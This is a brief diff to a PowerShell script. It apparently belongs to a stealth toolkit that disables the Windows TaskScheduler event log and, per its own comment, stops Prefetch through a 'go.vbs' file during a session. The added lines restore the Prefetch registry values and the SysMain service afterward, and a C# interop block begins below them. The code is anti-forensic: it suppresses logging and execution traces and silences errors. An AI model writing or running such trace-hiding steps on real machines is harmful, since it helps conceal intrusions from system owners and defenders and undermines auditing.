@@ -40,6 +40,15 @@ try {
     wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>$null
 } catch {}
 
+# ── RESTORE PREFETCH (was stopped by go.vbs during session) ───────────────────
+try {
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" `
+        -Name "EnablePrefetcher" -Value 3 -Type DWord -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" `
+        -Name "EnableSuperfetch" -Value 3 -Type DWord -Force -ErrorAction SilentlyContinue
+    Start-Service -Name "SysMain" -ErrorAction SilentlyContinue
+} catch {}
+
 $apiSource = @"
 using System;
 using System.Runtime.InteropServices;
